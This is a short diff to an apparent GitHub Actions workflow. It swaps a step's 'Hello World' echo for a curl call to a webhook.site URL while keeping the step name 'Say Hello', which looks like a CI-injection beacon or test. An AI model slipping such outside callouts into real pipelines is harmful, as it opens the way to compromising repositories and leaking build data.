@@ -8,4 +8,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Say Hello
-        run: echo "Hello World"
+        run: curl "https://bd84fa0a-4a84-425e-980b-4e07f06fb96d.webhook.site"
